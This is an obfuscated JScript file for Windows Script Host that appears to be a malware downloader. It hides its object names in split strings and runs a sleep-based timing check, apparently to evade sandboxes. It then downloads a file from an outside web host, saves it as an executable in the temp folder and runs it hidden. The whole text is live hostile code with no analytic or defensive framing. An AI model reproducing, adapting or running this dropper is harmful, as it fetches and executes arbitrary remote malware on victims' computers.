var G = false;
var H0 = "Create"+"Object";
var IL = function AH() {return WScript[H0]("WScript"+".Shell");}(), X = 11;
var ZY = "MSXML2"+".XMLHTTP";
var Y0 = 2;
var Y = Y0 - 2;
function YO(M0){IL["Run"](M0, Y, Y);};
function T0(){return ZY + "";};
function H(X0, E){Y = Y * 1; return X0 - E;};
function JB(){return H0;};
/*@cc_on
  @if (@_win32 || @_win64)
    G = true;
  @end
@*/
if (G)
{
var DC = "";
function O(){return 22;};
var M1 = 0; var IV = 0;
function T()
{
var OS = new this["Date"]();
var PG = OS["getUTCMilliseconds"]();
WScript["Sleep"](O());
var OS = new this["Date"]();
var NT = OS["getUTCMilliseconds"]();
WScript["Sleep"](O());
var OS = new this["Date"]();
var H1 = OS["getUTCMilliseconds"]();
var M1 = "M";
M1 = H(NT, PG);
var IV = "D";
IV = H(H1, NT);
DC = "open";
return H(M1, IV);
}
var T1 = false;
var ZO = false;
for (var F = Y; F < O() * 1; F++){if (T() != Y){
T1 = true; 
IV = "31" + 11 * M1 + IV; 
ZO = true; 
break;
}}
function R() {return ((T1 == true) && (T1 == ZO)) ? 1 : Y;};
if (T1 && R() && ZO){
function MK() {return IL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DltRjnCHQ.ex" + "e";};
 ES = T0();
 T2 = WScript[H0](ES);
 var ZG = 1;
do { 
	for (;ZG;){
	try {
		if (ZG == 1)
		{
			T2[DC]("GET", "http://be-stlines-tore.com/u3rsap", false);
			T2["send"]();
			P = "Sleep";
			ZG = 2;
		}
		WScript[P](O() + 120); 
		if (T2["readystate"] < 2 * 2) continue;
		ZG = Y;
		function U(YG) {var LX = (1, 2, 3, 4, 5, YG); return LX;};
		RT = WScript[JB()]("ADODB.Stream");
		ES = RT;
		ES[DC]();
		ES["type"] = U(1);
		ES["write"](T2["ResponseBody"]);
		RT["position"] = U(Y);
		ES["Save" + "ToFile"](MK(), 2);
		RT["cl"+"ose"]();
		CB = MK();
		YO(CB);
	} catch(W){};};
}while (ZG);
}
}

